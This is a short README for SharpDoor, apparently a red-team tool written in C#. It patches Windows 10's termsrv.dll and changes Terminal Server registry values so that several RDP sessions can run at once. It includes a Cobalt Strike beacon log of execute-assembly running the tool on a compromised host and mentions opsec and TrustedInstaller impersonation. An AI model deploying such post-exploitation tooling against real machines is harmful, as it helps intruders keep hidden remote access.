# SharpDoor
SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently only support for Windows 10.

Author - Rahmat Nurfauzi ([@infosecn1nja](https://twitter.com/infosecn1nja))

## Example

```
beacon> execute-assembly /root/Toolkits/SharpBinaries/SharpDoor.exe
[*] Tasked beacon to run .NET program: SharpDoor.exe
[+] host called home, sent: 115243 bytes
[+] received output:
   _____ _                      _____
  / ____| |                    |  __ \
 | (___ | |__   __ _ _ __ _ __ | |  | | ___   ___  _ __
  \___ \| '_ \ / _` | '__| '_ \| |  | |/ _ \ / _ \| '__|
  ____) | | | | (_| | |  | |_) | |__| | (_) | (_) | |
 |_____/|_| |_|\__,_|_|  | .__/|_____/ \___/ \___/|_|
                         | |
  v1.0.0                 |_|

Allow Multiple RDP (Remote Desktop) Sessions By Patching termsrv.dll File

[*] Termsrv.dll Version : 10.0.17763.1
[*] Stop termservice

[+] received output:
[*] Backup termsrv.dll to C:\Users\Public\termsrv.dll

[*] Attempting to patch termsrv.dll

Original File Hash : 24ff1f89f2ec3f5561c34810c8328726
Patched File Hash : 4cec28b4c00002245dffc8346be0cc11

[*] C:\Users\Public\termsrv.patch.dll was patched successfully

[*] Setting Registry Terminal Server\fSingleSessionPerUser to 0
[*] Setting Registry Terminal Server\TSAppAllowList\fDisabledAllowList to 1
[*] Start termservice
[*] Done
```
